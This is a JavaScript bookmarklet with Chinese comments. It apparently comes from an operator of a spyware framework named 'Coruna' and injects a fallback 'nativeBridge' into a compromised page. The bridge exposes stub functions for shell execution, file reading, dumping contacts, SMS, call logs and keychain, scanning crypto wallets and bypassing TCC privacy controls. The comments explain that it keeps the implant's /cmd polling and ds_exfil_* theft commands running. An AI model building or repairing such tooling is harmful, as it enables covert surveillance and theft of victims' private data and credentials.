javascript:(async function _corunaEmergencyInject() {
  'use strict';
  try {
    console.log('[EMERGENCY-INJECT] 强制注入 SOFT-FALLBACK bridge...');
    // 1) 构造 SOFT-FALLBACK bridge impl (跟本地 chain_loader.js 一致)
    var fallbackImpl = {
      isReady: function () { return false; },
      _is_soft_fallback: true,
      _emergency_injected: true,
      _inject_ts: Date.now(),
      listdir:      async function (p) { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'listdir', params: { path: p } }; },
      readFile:     async function (p) { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'readFile', params: { path: p } }; },
      find:         async function (p) { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'find', params: { pattern: p } }; },
      exec:         async function (c) { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'exec', params: { cmd: c } }; },
      dumpContacts: async function () { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'dumpContacts' }; },
      dumpSms:      async function () { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'dumpSms' }; },
      dumpCalls:    async function () { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'dumpCalls' }; },
      dumpKeychain: async function () { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'dumpKeychain' }; },
      scanWallets:  async function () { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'scanWallets' }; },
      bypassTcc:    async function () { return { ok: false, error: 'no-kexploit-wasm', method: 'soft-fallback', fn: 'bypassTcc' }; }
    };
    // 2) 用 defineProperty 锁定 window.nativeBridge
    try {
      Object.defineProperty(window, 'nativeBridge', {
        value: fallbackImpl, writable: false, configurable: true, enumerable: true
      });
    } catch (e1) {
      try { window.nativeBridge = fallbackImpl; } catch (e2) {}
    }
    // 3) 标记位 (post_exploit.js 用这些判断 bridge 状态)
    window.__corunaBridgeActivated = true;
    window.__corunaBridgeSoftFallback = true;
    window._kexploit_wasm_loaded = false;
    window._kexploit_wasm_error = 'emergency-injected';
    // 4) nativeBridgeReady 也设为 true (post_exploit 的 hasNativeBridge 会查这个)
    try {
      Object.defineProperty(window, 'nativeBridgeReady', {
        value: true, writable: false, configurable: true, enumerable: true
      });
    } catch (e) { window.nativeBridgeReady = true; }
    // 5) 验证
    console.log('[EMERGENCY-INJECT] ✓ window.nativeBridge =', window.nativeBridge);
    console.log('[EMERGENCY-INJECT] ✓ __corunaBridgeActivated =', window.__corunaBridgeActivated);
    console.log('[EMERGENCY-INJECT] ✓ __corunaBridgeSoftFallback =', window.__corunaBridgeSoftFallback);
    console.log('[EMERGENCY-INJECT] ✓ isReady() =', window.nativeBridge.isReady());
    console.log('[EMERGENCY-INJECT] ✓ hasNativeBridge() =', (typeof hasNativeBridge === 'function' ? hasNativeBridge() : 'N/A (post_exploit.js not yet loaded)'));
    // 6) 立刻触发 /cmd 轮询 (post_exploit.js 每 5s 一次, 等下次轮询就行)
    console.log('[EMERGENCY-INJECT] 完成. 等 5-10s 让 post_exploit.js 下一轮 /cmd 轮询. 之后 ds_exfil_* / ds_info 命令就会走 SOFT-FALLBACK 路径.');
    console.log('[EMERGENCY-INJECT] 提示: 如果还看到 _corunaPrimitives missing, 说明这是 native_bridge.js 报的旧错误, 不影响 SOFT-FALLBACK. 看新返回 JSON 的 chain_state.bridge_activated 是否变 true.');
    return true;
  } catch (e) {
    console.error('[EMERGENCY-INJECT] FAIL:', e);
    return false;
  }
})();
